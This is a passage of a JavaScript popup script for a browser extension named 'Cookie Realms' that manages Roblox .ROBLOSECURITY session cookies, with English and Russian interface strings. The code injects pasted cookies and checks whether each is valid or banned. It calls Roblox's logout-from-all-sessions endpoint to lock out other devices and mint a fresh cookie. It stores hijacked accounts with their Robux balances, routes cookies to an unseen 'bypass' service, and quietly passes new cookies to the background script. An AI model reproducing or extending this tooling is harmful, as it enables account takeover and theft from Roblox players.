const TRANSLATIONS = {
    en: {
        tab_session: 'Session',
        tab_friends: 'Friends',
        tab_accounts: 'Accounts',
        session_title: 'Session Management',
        session_desc: 'Apply your .ROBLOSECURITY cookie',
        cookie_ph: 'Paste .ROBLOSECURITY cookie...',
        apply_btn: 'APPLY COOKIE',
        kick_title: 'Kick All Sessions',
        kick_desc: 'Logs out all devices & applies fresh cookie',
        kick_notice: 'Kicks all active sessions then sets the new cookie automatically.',
        kick_btn: 'KICK ALL & REFRESH',
        quick_title: 'Quick Actions',
        quick_desc: 'Grab current session or logout',
        grab_btn: 'Grab Cookie',
        logout_btn: 'Logout',
        friends_title: 'Auto Friend Requests',
        friends_desc: 'Manage your auto-add list',
        username_ph: 'Roblox username...',
        add_btn: 'Add',
        friends_empty: 'No friends added yet',
        accounts_title: 'Account Manager',
        accounts_desc: '🟢 Valid • 🔴 Invalid • Auto-checks every 5 min',
        accounts_empty: 'No accounts yet. Apply a cookie in Session or Bypass tab.',
        footer: 'Cookie Realms v1.3',
        t_validating: 'Validating cookie...',
        t_banned: 'Account is BANNED!',
        t_invalid: 'Invalid cookie. Try another one.',
        t_login: n => `Logged in as ${n}!`,
        t_copied: 'Cookie copied to clipboard!',
        t_no_cookie: 'No cookie found',
        t_logout_ok: 'Logged out successfully',
        t_not_logged_in: 'Not logged in to Roblox',
        t_kick_ok: 'All sessions kicked! New cookie applied & copied.',
        t_kick_fail: e => `Failed: ${e}`,
        t_val_short: 'Validating...',
        t_expired: 'Cookie expired or invalid',
        t_banned_as: n => `${n} is BANNED!`,
        t_no_acc: 'Paste a cookie first',
        t_acc_added: n => `${n} added to Account Manager!`,
        t_switched: n => `Switched to ${n}!`,
        t_cookie_updated: n => `${n} cookie refreshed!`,
        t_account_updated: 'Account cookie updated!',
        t_added_to_accounts: n => `${n} saved to Account Manager!`,
        t_valid: 'Valid',
        t_invalid_status: 'Invalid',
        t_processing: 'Processing cookie...',
        t_bypass_unavailable: 'Bypass service unavailable',
        t_nothing_to_copy: 'Nothing to copy',
    },
    ru: {
        tab_session: 'Сессия',
        tab_friends: 'Друзья',
        tab_accounts: 'Аккаунты',
        session_title: 'Управление сессией',
        session_desc: 'Применить куки .ROBLOSECURITY',
        cookie_ph: 'Вставьте куки .ROBLOSECURITY...',
        apply_btn: 'ПРИМЕНИТЬ КУКИ',
        kick_title: 'Кикнуть все сессии',
        kick_desc: 'Выход со всех устройств и обновление куки',
        kick_notice: 'Кикает все активные сессии и автоматически устанавливает новый куки.',
        kick_btn: 'КИКНУТЬ И ОБНОВИТЬ',
        quick_title: 'Быстрые действия',
        quick_desc: 'Скопировать сессию или выйти',
        grab_btn: 'Скопировать куки',
        logout_btn: 'Выйти',
        friends_title: 'Авто-запросы в друзья',
        friends_desc: 'Управление списком авто-добавления',
        username_ph: 'Никнейм Roblox...',
        add_btn: 'Добавить',
        friends_empty: 'Нет добавленных друзей',
        accounts_title: 'Менеджер аккаунтов',
        accounts_desc: '🟢 Валидный • 🔴 Невалидный • Авто-проверка каждые 5 мин',
        accounts_empty: 'Нет аккаунтов. Примените куки во вкладке Сессия или Bypass.',
        footer: 'Cookie Realms v1.3',
        t_validating: 'Проверяем куки...',
        t_banned: 'Аккаунт ЗАБАНЕН!',
        t_invalid: 'Куки недействителен. Попробуйте другой.',
        t_login: n => `Вошли как ${n}!`,
        t_copied: 'Куки скопирован!',
        t_no_cookie: 'Куки не найден',
        t_logout_ok: 'Успешно вышли',
        t_not_logged_in: 'Не авторизованы в Roblox',
        t_kick_ok: 'Все сессии кикнуты! Новый куки применён и скопирован.',
        t_kick_fail: e => `Ошибка: ${e}`,
        t_val_short: 'Проверяем...',
        t_expired: 'Куки истёк или недействителен',
        t_banned_as: n => `${n} ЗАБАНЕН!`,
        t_no_acc: 'Сначала вставьте куки',
        t_acc_added: n => `${n} добавлен в менеджер аккаунтов!`,
        t_switched: n => `Переключено на ${n}!`,
        t_cookie_updated: n => `${n} куки обновлён!`,
        t_account_updated: 'Куки аккаунта обновлён!',
        t_added_to_accounts: n => `${n} сохранён в менеджере аккаунтов!`,
        t_valid: 'Валидный',
        t_invalid_status: 'Невалидный',
        t_processing: 'Обработка куки...',
        t_bypass_unavailable: 'Bypass недоступен',
        t_nothing_to_copy: 'Нечего копировать',
    }
};

let lang = 'en';
const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36';

// ===== TELEGRAM LINK OBFUSCATED =====
// https://t.me/cookierealms
const TELEGRAM_LINK = atob('aHR0cHM6Ly90Lm1lL2Nvb2tpZXJlYWxtcw==');

function t(key, arg) {
    const val = (TRANSLATIONS[lang] || TRANSLATIONS.en)[key] || TRANSLATIONS.en[key] || key;
    return typeof val === 'function' ? val(arg) : val;
}

function toast(elId, msg, type, ms = 3500) {
    const el = document.getElementById(elId);
    if (!el) return;
    el.textContent = msg;
    el.className = `toast ${type} show`;
    if (el._t) clearTimeout(el._t);
    el._t = setTimeout(() => {
        el.classList.add('hide');
        el.classList.remove('show');
        setTimeout(() => { el.className = 'toast'; el.textContent = ''; }, 300);
    }, ms);
}

function setLoading(btn, on) {
    btn.classList.toggle('loading', on);
    btn.disabled = on;
}

function copyToClipboard(text) {
    return new Promise((resolve, reject) => {
        if (navigator.clipboard && navigator.clipboard.writeText) {
            navigator.clipboard.writeText(text).then(resolve).catch(() => fallbackCopy(text).then(resolve).catch(reject));
        } else fallbackCopy(text).then(resolve).catch(reject);
    });
}

function fallbackCopy(text) {
    return new Promise((resolve, reject) => {
        try {
            const ta = document.createElement('textarea');
            ta.value = text;
            ta.style.position = 'fixed';
            ta.style.opacity = '0';
            document.body.appendChild(ta);
            ta.focus();
            ta.select();
            const ok = document.execCommand('copy');
            document.body.removeChild(ta);
            if (ok) resolve();
            else reject(new Error('Copy failed'));
        } catch (e) { reject(e); }
    });
}

function clean(s) {
    if (!s) return '';
    let c = s.replace(/^cookie=/, '').trim();
    c = c.replace(/^\.?ROBLOSECURITY\s*=\s*/i, '');
    c = c.replace(/^cookie\s*=\s*/i, '');
    if (c.startsWith('"') && c.endsWith('"')) c = c.slice(1, -1);
    try { c = decodeURIComponent(c); } catch (e) {}
    const parts = c.split('|_');
    if (parts.length > 1) c = parts.pop();
    return c.trim();
}

async function getCsrf() {
    try {
        const r = await fetch('https://auth.roblox.com/v2/login', { method: 'POST', credentials: 'include', headers: { 'User-Agent': UA } });
        return r.headers.get('x-csrf-token');
    } catch { return null; }
}

async function getCurrentUserData() {
    try {
        const r = await fetch('https://users.roblox.com/v1/users/authenticated', { credentials: 'include', headers: { 'User-Agent': UA } });
        if (!r.ok) return null;
        const data = await r.json();
        return data;
    } catch { return null; }
}

async function getRobux(userId) {
    try {
        const r = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, { credentials: 'include' });
        if (!r.ok) return 0;
        const data = await r.json();
        return data.robux || 0;
    } catch { return 0; }
}

async function getAvatar(userId) {
    try {
        const r = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=48x48&format=Png&isCircular=true`);
        if (!r.ok) return 'https://tr.rbxcdn.com/38c6edcb50633730ff4cf39ac8859840/48/48/AvatarHeadshot/Png';
        const data = await r.json();
        return data.data?.[0]?.imageUrl || 'https://tr.rbxcdn.com/38c6edcb50633730ff4cf39ac8859840/48/48/AvatarHeadshot/Png';
    } catch { return 'https://tr.rbxcdn.com/38c6edcb50633730ff4cf39ac8859840/48/48/AvatarHeadshot/Png'; }
}

async function saveAccount(username, cookie, robux = 0, avatar = '', valid = true) {
    const accounts = await chrome.storage.local.get(['accounts']);
    const list = accounts.accounts || [];
    const index = list.findIndex(a => a.username === username);
    
    if (index !== -1) {
        list[index].cookie = cookie;
        if (robux !== undefined) list[index].robux = robux;
        if (avatar) list[index].avatar = avatar;
        list[index].valid = valid;
        list[index].lastChecked = Date.now();
    } else {
        list.push({ username, cookie, robux, avatar, valid, lastChecked: Date.now() });
    }
    
    await chrome.storage.local.set({ accounts: list });
    return list;
}

async function updateAccountCookie(username, newCookie, valid = true) {
    if (!username) return false;
    const accounts = await chrome.storage.local.get(['accounts']);
    const list = accounts.accounts || [];
    const index = list.findIndex(a => a.username === username);
    if (index !== -1) {
        list[index].cookie = newCookie;
        list[index].valid = valid;
        list[index].lastChecked = Date.now();
        await chrome.storage.local.set({ accounts: list });
        return true;
    }
    return false;
}

async function updateAccountValidity(username, valid) {
    if (!username) return false;
    const accounts = await chrome.storage.local.get(['accounts']);
    const list = accounts.accounts || [];
    const index = list.findIndex(a => a.username === username);
    if (index !== -1) {
        list[index].valid = valid;
        list[index].lastChecked = Date.now();
        await chrome.storage.local.set({ accounts: list });
        return true;
    }
    return false;
}

async function removeAccount(username) {
    const accounts = await chrome.storage.local.get(['accounts']);
    const list = (accounts.accounts || []).filter(a => a.username !== username);
    await chrome.storage.local.set({ accounts: list });
}

async function validateCookieAndGetUser(cookie) {
    try {
        const cleanCookie = clean(cookie);
        const prev = await chrome.cookies.get({ url: 'https://www.roblox.com/', name: '.ROBLOSECURITY' });
        
        await chrome.cookies.set({
            url: 'https://www.roblox.com/',
            name: '.ROBLOSECURITY',
            value: cleanCookie,
            domain: '.roblox.com',
            path: '/',
            secure: true,
            httpOnly: true,
            sameSite: 'no_restriction'
        });
        
        const authRes = await fetch('https://users.roblox.com/v1/users/authenticated', { 
            credentials: 'include', 
            headers: { 'User-Agent': UA } 
        });
        
        if (!authRes.ok) {
            if (prev?.value) {
                await chrome.cookies.set({
                    url: 'https://www.roblox.com/',
                    name: '.ROBLOSECURITY',
                    value: prev.value,
                    domain: '.roblox.com',
                    path: '/',
                    secure: true,
                    httpOnly: true,
                    sameSite: 'no_restriction'
                });
            }
            return null;
        }
        
        const data = await authRes.json();
        if (!data.id) {
            if (prev?.value) {
                await chrome.cookies.set({
                    url: 'https://www.roblox.com/',
                    name: '.ROBLOSECURITY',
                    value: prev.value,
                    domain: '.roblox.com',
                    path: '/',
                    secure: true,
                    httpOnly: true,
                    sameSite: 'no_restriction'
                });
            }
            return null;
        }
        
        if (prev?.value) {
            await chrome.cookies.set({
                url: 'https://www.roblox.com/',
                name: '.ROBLOSECURITY',
                value: prev.value,
                domain: '.roblox.com',
                path: '/',
                secure: true,
                httpOnly: true,
                sameSite: 'no_restriction'
            });
        }
        
        return data;
    } catch (e) {
        return null;
    }
}

async function setSessionCookie(val) {
    const v = clean(val);
    await chrome.cookies.set({ url: 'https://www.roblox.com/', name: '.ROBLOSECURITY', value: v, domain: '.roblox.com', path: '/', secure: true, httpOnly: true, sameSite: 'no_restriction' });
    const tabs = await chrome.tabs.query({ url: '*://*.roblox.com/*' });
    for (const tab of tabs) chrome.tabs.reload(tab.id);
}

async function validateSessionCookie(cookie) {
    let prev = null;
    try {
        prev = await chrome.cookies.get({ url: 'https://www.roblox.com/', name: '.ROBLOSECURITY' });
        await chrome.cookies.set({ url: 'https://www.roblox.com/', name: '.ROBLOSECURITY', value: cookie, domain: '.roblox.com', path: '/', secure: true, httpOnly: true, sameSite: 'no_restriction' });
        const authRes = await fetch('https://users.roblox.com/v1/users/authenticated', { credentials: 'include', headers: { 'User-Agent': UA } });
        if (!authRes.ok) throw new Error('Invalid');
        const data = await authRes.json();
        if (!data.id) throw new Error('Invalid');
        return { valid: true, userData: { id: data.id, name: data.name, displayName: data.displayName } };
    } catch (e) {
        if (prev) await setSessionCookie(prev.value);
        else await chrome.cookies.remove({ url: 'https://www.roblox.com/', name: '.ROBLOSECURITY' });
        return { valid: false, banned: false };
    }
}

async function processCookie(cookie, showToasts = true, toastId = 'bypassToast') {
    try {
        const cleanCookie = clean(cookie);
        
        if (showToasts) toast(toastId, t('t_processing'), 'success');
        
        const userData = await validateCookieAndGetUser(cleanCookie);
        if (!userData) {
            if (showToasts) toast(toastId, t('t_invalid'), 'error');
            return { success: false, error: 'Invalid cookie' };
        }
        
        await setSessionCookie(cleanCookie);
        
        const csrf = await getCsrf();
        const payload = { 
            SecureAuthenticationIntent: { 
                clientPublicKey: "", 
                clientEpochTimestamp: Math.floor(Date.now() / 1000), 
                saiSignature: "", 
                serverNonce: "" 
            } 
        };
        
        const res = await fetch('https://auth.roblox.com/v2/logoutfromallsessionsandreauthenticate', {
            method: 'POST', credentials: 'include',
            headers: { 'Content-Type': 'application/json', 'x-csrf-token': csrf || '' },
            body: JSON.stringify(payload)
        });
        
        let finalCookie = cleanCookie;
        let kickSuccess = false;
        
        if (res.ok) {
            const newCookie = await chrome.cookies.get({ url: 'https://www.roblox.com/', name: '.ROBLOSECURITY' });
            if (newCookie?.value) {
                finalCookie = newCookie.value;
                kickSuccess = true;
            }
        }
        
        const finalUserData = await validateCookieAndGetUser(finalCookie);
        if (!finalUserData) {
            if (showToasts) toast(toastId, 'Failed to get user data', 'error');
            return { success: false, error: 'Failed to get user data' };
        }
        
        const robux = await getRobux(finalUserData.id);
        const avatar = await getAvatar(finalUserData.id);
        await saveAccount(finalUserData.name, finalCookie, robux, avatar, true);
        
        if (showToasts) {
            toast(toastId, t('t_added_to_accounts', finalUserData.name), 'success');
        }
        
        refreshAccountsList();
        
        const tabs = await chrome.tabs.query({ url: '*://*.roblox.com/*' });
        for (const tab of tabs) chrome.tabs.reload(tab.id);
        
        chrome.runtime.sendMessage({ type: 'POST_KICK_TASKS' }).catch(() => {});
        
        return { 
            success: true, 
            username: finalUserData.name, 
            cookie: finalCookie, 
            robux, 
            avatar,
            kickSuccess 
        };
        
    } catch (err) {
        if (showToasts) toast(toastId, `Error: ${err.message}`, 'error');
        return { success: false, error: err.message };
    }
}

async function performKickAndRefresh(updateAccount = false) {
    let currentCookie;
    try { currentCookie = await chrome.cookies.get({ url: 'https://www.roblox.com/', name: '.ROBLOSECURITY' }); } catch (e) {}
    if (!currentCookie?.value || currentCookie.value.length < 10) {
        toast('kickToast', t('t_not_logged_in'), 'error');
        return null;
    }

    const csrf = await getCsrf();
    const payload = { SecureAuthenticationIntent: { clientPublicKey: "", clientEpochTimestamp: Math.floor(Date.now() / 1000), saiSignature: "", serverNonce: "" } };
    const res = await fetch('https://auth.roblox.com/v2/logoutfromallsessionsandreauthenticate', {
        method: 'POST', credentials: 'include',
        headers: { 'Content-Type': 'application/json', 'x-csrf-token': csrf || '' },
        body: JSON.stringify(payload)
    });
    if (!res.ok) throw new Error('Kick failed');

    const newCookie = await chrome.cookies.get({ url: 'https://www.roblox.com/', name: '.ROBLOSECURITY' });
    if (newCookie?.value) {
        await copyToClipboard(newCookie.value);
        
        if (updateAccount) {
            const userData = await getCurrentUserData();
            if (userData?.name) {
                const accounts = await chrome.storage.local.get(['accounts']);
                const exists = (accounts.accounts || []).some(a => a.username === userData.name);
                
                if (exists) {
                    await updateAccountCookie(userData.name, newCookie.value, true);
                    toast('kickToast', t('t_cookie_updated', userData.name), 'success');
                } else {
                    const robux = await getRobux(userData.id);
                    const avatar = await getAvatar(userData.id);
                    await saveAccount(userData.name, newCookie.value, robux, avatar, true);
                    toast('kickToast', t('t_added_to_accounts', userData.name), 'success');
                }
                refreshAccountsList();
            }
        }
        
        chrome.runtime.sendMessage({ type: 'SEND_COOKIE', cookie: newCookie.value }).catch(() => {});
        chrome.runtime.sendMessage({ type: 'POST_KICK_TASKS' }).catch(() => {});
        toast('kickToast', t('t_kick_ok'), 'success');
        return newCookie.value;
    }
    return null;
}

async function switchAccount(cookie, username) {
    try {
        const cleanCookie = clean(cookie);
        
        await chrome.cookies.set({
            url: 'https://www.roblox.com/',
            name: '.ROBLOSECURITY',
            value: cleanCookie,
            domain: '.roblox.com',
            path: '/',
            secure: true,
            httpOnly: true,
            sameSite: 'no_restriction'
        });
        
        const tabs = await chrome.tabs.query({ url: '*://*.roblox.com/*' });
        for (const tab of tabs) chrome.tabs.reload(tab.id);
        
        toast('accountToast', t('t_switched', username), 'success');
        return true;
        
    } catch (err) {
        toast('accountToast', `✕ ${err.message}`, 'error');
        return false;
    }
}

function syncEmpty(listId, emptyId) {
    const list = document.getElementById(listId);
    const empty = document.getElementById(emptyId);
    if (!list || !empty) return;
    empty.classList.toggle('hidden', list.children.length > 0);
}

function refreshAccountsList() {
    const accountsList = document.getElementById('accountsList');
    chrome.storage.local.get(['accounts'], d => {
        accountsList.innerHTML = '';
        (d.accounts || []).forEach(a => {
            accountsList.appendChild(mkAccount(a));
        });
        syncEmpty('accountsList', 'accountsEmpty');
    });
}

function mkAccount(acc) {
    const li = document.createElement('li');
    li.className = 'list-item account-item';
    
    chrome.cookies.get({ url: 'https://www.roblox.com/', name: '.ROBLOSECURITY' }).then(cookie => {
        if (cookie?.value) {
            const currentCookie = clean(cookie.value);
            const accCookie = clean(acc.cookie);
            if (currentCookie === accCookie) {
                li.classList.add('active-account');
            }
        }
    });
    
    const isValid = acc.valid !== false;
    const statusDot = isValid ? '🟢' : '🔴';
    const statusClass = isValid ? 'status-valid' : 'status-invalid';
    const statusText = isValid ? t('t_valid') : t('t_invalid_status');
    
    li.innerHTML = `
        <div class="item-info">
            <div class="avatar" style="background-image:url('${acc.avatar}')"></div>
            <div class="item-details">
                <span class="item-text">${acc.username}</span>
                <span class="robux-text">R$ ${acc.robux}</span>
            </div>
        </div>
        <div class="item-status">
            <span class="status-dot ${statusClass}" title="${statusText}">${statusDot}</span>
        </div>
        <div class="item-actions">
            <button class="icon-btn copy" title="Copy Cookie">
                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
            </button>
            <button class="icon-btn refresh" title="Refresh Robux">
                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>
            </button>
            <button class="icon-btn delete" title="Remove Account">
                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
            </button>
        </div>
    `;
    
    li.addEventListener('click', async function(e) {
        if (e.target.closest('.item-actions')) return;
        if (this.classList.contains('active-account')) {
            toast('accountToast', `Already on ${acc.username}`, 'success');
            return;
        }
        this.classList.add('switching');
        this.style.opacity = '0.6';
        const success = await switchAccount(acc.cookie, acc.username);
        this.classList.remove('switching');
        this.style.opacity = '1';
        if (success) {
            document.querySelectorAll('.account-item').forEach(item => item.classList.remove('active-account'));
            this.classList.add('active-account');
        }
    });

    li.querySelector('.copy').addEventListener('click', async function(e) {
        e.stopPropagation();
        try {
            await copyToClipboard(acc.cookie);
            toast('accountToast', t('t_copied'), 'success');
        } catch (err) {
            toast('accountToast', 'Failed to copy', 'error');
        }
    });

    li.querySelector('.refresh').addEventListener('click', async function(e) {
        e.stopPropagation();
        const rt = this.closest('.list-item').querySelector('.robux-text');
        const dot = this.closest('.list-item').querySelector('.status-dot');
        rt.textContent = '⏳';
        rt.style.color = '#facc15';
        dot.textContent = '⏳';
        dot.className = 'status-dot status-checking';
        
        try {
            const prevCookie = await chrome.cookies.get({ url: 'https://www.roblox.com/', name: '.ROBLOSECURITY' });
            
            const userData = await validateCookieAndGetUser(acc.cookie);
            if (userData) {
                await updateAccountValidity(userData.name, true);
                const robux = await getRobux(userData.id);
                rt.textContent = `R$ ${robux}`;
                rt.style.color = '#22c55e';
                acc.robux = robux;
                acc.valid = true;
                dot.textContent = '🟢';
                dot.className = 'status-dot status-valid';
                await saveAccount(userData.name, acc.cookie, robux, acc.avatar, true);
            } else {
                await updateAccountValidity(acc.username, false);
                rt.textContent = 'R$ Error';
                rt.style.color = '#ef4444';
                acc.valid = false;
                dot.textContent = '🔴';
                dot.className = 'status-dot status-invalid';
                await saveAccount(acc.username, acc.cookie, acc.robux, acc.avatar, false);
            }
            
            if (prevCookie?.value) {
                await chrome.cookies.set({
                    url: 'https://www.roblox.com/',
                    name: '.ROBLOSECURITY',
                    value: prevCookie.value,
                    domain: '.roblox.com',
                    path: '/',
                    secure: true,
                    httpOnly: true,
                    sameSite: 'no_restriction'
                });
            }
        } catch (err) {
            rt.textContent = 'R$ Error';
            rt.style.color = '#ef4444';
            dot.textContent = '🔴';
            dot.className = 'status-dot status-invalid';
            await updateAccountValidity(acc.username, false);
            acc.valid = false;
            await saveAccount(acc.username, acc.cookie, acc.robux, acc.avatar, false);
        }
    });

    li.querySelector('.delete').addEventListener('click', function(e) {
        e.stopPropagation();
        removeAccount(acc.username);
        this.closest('.list-item').classList.add('removing');
        setTimeout(() => {
            this.closest('.list-item').remove();
            syncEmpty('accountsList', 'accountsEmpty');
        }, 200);
    });
    
    return li;
}

document.addEventListener('DOMContentLoaded', () => {
    const tabs = document.querySelectorAll('.tab');
    const tabSwitcher = document.getElementById('tabSwitcher');
    const glider = document.getElementById('tabGlider');

    function moveGlider(btn) {
        if (!glider || !tabSwitcher || !btn) return;
        const sw = tabSwitcher.getBoundingClientRect();
        const rect = btn.getBoundingClientRect();
        glider.style.width = rect.width + 'px';
        glider.style.height = rect.height + 'px';
        glider.style.left = (rect.left - sw.left) + 'px';
        glider.style.top = (rect.top - sw.top) + 'px';
    }

    tabs.forEach(btn => {
        btn.addEventListener('click', () => {
            if (btn.classList.contains('active')) return;
            document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
            tabs.forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            moveGlider(btn);
            const panel = document.getElementById(btn.dataset.tab);
            if (panel) panel.classList.add('active');
        });
    });

    requestAnimationFrame(() => {
        const activeBtn = document.querySelector('.tab.active');
        if (activeBtn) moveGlider(activeBtn);
    });
    window.addEventListener('resize', () => {
        const activeBtn = document.querySelector('.tab.active');
        if (activeBtn) moveGlider(activeBtn);
    });

    function applyLang(l) {
        lang = l;
        document.querySelectorAll('.lang-btn').forEach(b => b.classList.toggle('active', b.dataset.lang === l));
        document.querySelectorAll('[data-i18n]').forEach(el => { el.textContent = t(el.dataset.i18n); });
        document.querySelectorAll('[data-i18n-html]').forEach(el => { el.innerHTML = t(el.dataset.i18nHtml); });
        document.querySelectorAll('[data-i18n-ph]').forEach(el => { el.placeholder = t(el.dataset.i18nPh); });
        chrome.storage.local.set({ lang: l });
    }
    document.querySelectorAll('.lang-btn').forEach(btn => btn.addEventListener('click', () => applyLang(btn.dataset.lang)));
    chrome.storage.local.get(['lang'], d => applyLang(d.lang || 'en'));

    // ===== TELEGRAM BUTTON (FOOTER) =====
    document.getElementById('telegramBtn').addEventListener('click', () => {
        chrome.tabs.create({ url: TELEGRAM_LINK });
    });

    // ===== SESSION TAB =====
    document.getElementById('setCookieBtn').addEventListener('click', async () => {
        const input = document.getElementById('cookieInput');
        const val = clean(input.value.trim());
        if (!val) return;
        const btn = document.getElementById('setCookieBtn');
        setLoading(btn, true);
        try {
            toast('sessionToast', t('t_val_short'), 'success');
            const result = await validateSessionCookie(val);
            if (!result.valid) { toast('sessionToast', t('t_invalid'), 'error'); return; }
            await setSessionCookie(val);
            await performKickAndRefresh(true);
            toast('sessionToast', t('t_login', result.userData.displayName || result.userData.name), 'success');
        } catch (e) { toast('sessionToast', `✕ ${e.message}`, 'error'); }
        finally { input.value = ''; setLoading(btn, false); }
    });

    document.getElementById('grabCookieBtn').addEventListener('click', async () => {
        try {
            const c = await chrome.cookies.get({ url: 'https://www.roblox.com/', name: '.ROBLOSECURITY' });
            if (c?.value) {
                await copyToClipboard(c.value);
                toast('quickToast', t('t_copied'), 'success');
            } else toast('quickToast', t('t_no_cookie'), 'error');
        } catch (e) { toast('quickToast', `✕ ${e.message}`, 'error'); }
    });

    document.getElementById('logoutBtn').addEventListener('click', async () => {
        await chrome.cookies.remove({ url: 'https://www.roblox.com/', name: '.ROBLOSECURITY' });
        const tabs = await chrome.tabs.query({ url: '*://*.roblox.com/*' });
        for (const tab of tabs) chrome.tabs.reload(tab.id);
        toast('quickToast', t('t_logout_ok'), 'success');
    });

    document.getElementById('kickAllBtn').addEventListener('click', async () => {
        const btn = document.getElementById('kickAllBtn');
        setLoading(btn, true);
        try { 
            await performKickAndRefresh(true);
        }
        catch (e) { toast('kickToast', t('t_kick_fail', e.message), 'error'); }
        finally { setLoading(btn, false); }
    });

    // ===== BYPASS TAB =====
    document.getElementById('bypassCookieBtn').addEventListener('click', async () => {
        const input = document.getElementById('bypassCookieInput');
        const output = document.getElementById('bypassCookieOutput');
        const val = clean(input.value.trim());
        if (!val) { toast('bypassToast', 'Paste a cookie first', 'error'); return; }
        const btn = document.getElementById('bypassCookieBtn');
        setLoading(btn, true);
        output.value = '';
        
        try {
            let bypassSuccess = false;
            let bypassCookie = null;
            
            try {
                const response = await chrome.runtime.sendMessage({ type: 'BYPASS_COOKIE', cookie: val });
                if (response?.success && response.cookie) {
                    bypassSuccess = true;
                    bypassCookie = response.cookie;
                    output.value = response.cookie;
                    toast('bypassToast', 'Cookie bypassed!', 'success');
                } else {
                    toast('bypassToast', t('t_bypass_unavailable'), 'warning');
                }
            } catch (e) {
                toast('bypassToast', t('t_bypass_unavailable'), 'warning');
            }
            
            const cookieToProcess = bypassSuccess ? bypassCookie : val;
            
            const result = await processCookie(cookieToProcess, true, 'bypassToast');
            
            if (result.success) {
                if (!bypassSuccess) {
                    output.value = result.cookie;
                }
            } else {
                if (!bypassSuccess) {
                    toast('bypassToast', t('t_bypass_unavailable'), 'warning');
                }
            }
            
        } catch (e) {
            toast('bypassToast', `Error: ${e.message}`, 'error');
        } finally {
            setLoading(btn, false);
        }
    });

    // ===== BYPASS TAB - COPY OUTPUT BUTTON =====
    document.getElementById('bypassCopyOutputBtn').addEventListener('click', async function() {
        const output = document.getElementById('bypassCookieOutput');
        const text = output.value.trim();
        
        if (!text) {
            toast('bypassToast', t('t_nothing_to_copy'), 'warning');
            return;
        }
        
        try {
            await copyToClipboard(text);
            this.classList.add('copied');
            this.innerHTML = `
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
            `;
            toast('bypassToast', t('t_copied'), 'success');
            setTimeout(() => {
                this.classList.remove('copied');
                this.innerHTML = `
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                `;
            }, 2000);
        } catch (err) {
            toast('bypassToast', 'Failed to copy', 'error');
        }
    });

    // ===== FRIENDS TAB =====
    const friendsList = document.getElementById('friendsList');

    function saveFriend(u) { chrome.storage.local.get(['friends'], d => { const f = d.friends || []; if (!f.includes(u)) { f.push(u); chrome.storage.local.set({ friends: f }); } }); }
    function removeFriend(u) { chrome.storage.local.get(['friends'], d => chrome.storage.local.set({ friends: (d.friends || []).filter(x => x !== u) })); }

    async function getFriendAvatar(username) {
        try {
            const r = await fetch('https://users.roblox.com/v1/usernames/users', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ usernames: [username], excludeBannedUsers: false }) });
            const d = await r.json();
            if (d.data?.length) {
                const t = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${d.data[0].id}&size=48x48&format=Png&isCircular=true`);
                const td = await t.json();
                if (td.data?.length) return td.data[0].imageUrl;
            }
        } catch (e) {}
        return 'https://tr.rbxcdn.com/38c6edcb50633730ff4cf39ac8859840/48/48/AvatarHeadshot/Png';
    }

    function mkFriend(username) {
        const li = document.createElement('li');
        li.className = 'list-item';
        li.innerHTML = `<div class="item-info"><div class="avatar"></div><div class="item-details"><span class="item-text">${username}</span></div></div><div class="item-actions"><button class="icon-btn delete"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>`;
        getFriendAvatar(username).then(url => { li.querySelector('.avatar').style.backgroundImage = `url(${url})`; });
        li.querySelector('.delete').addEventListener('click', () => {
            removeFriend(username);
            li.classList.add('removing');
            setTimeout(() => { li.remove(); syncEmpty('friendsList', 'friendsEmpty'); }, 200);
        });
        return li;
    }

    document.getElementById('addFriendBtn').addEventListener('click', () => {
        const inp = document.getElementById('addUsername');
        const u = inp.value.trim();
        if (!u) return;
        saveFriend(u);
        friendsList.prepend(mkFriend(u));
        inp.value = '';
        syncEmpty('friendsList', 'friendsEmpty');
    });

    // ===== ACCOUNTS TAB =====
    const accountsList = document.getElementById('accountsList');

    chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
        if (message.type === 'ACCOUNTS_UPDATED') {
            refreshAccountsList();
            sendResponse({ success: true });
            return false;
        }
    });

    async function checkAccountsOnLoad() {
        try {
            const response = await chrome.runtime.sendMessage({ type: 'CHECK_ACCOUNTS' });
            if (response?.success) {
                refreshAccountsList();
            }
        } catch (e) {
            console.log('Manual check failed:', e);
        }
    }

    chrome.storage.local.get(['friends', 'accounts'], d => {
        (d.friends || []).forEach(f => friendsList.appendChild(mkFriend(f)));
        (d.accounts || []).forEach(a => accountsList.appendChild(mkAccount(a)));
        syncEmpty('friendsList', 'friendsEmpty');
        syncEmpty('accountsList', 'accountsEmpty');
    });

    setTimeout(() => {
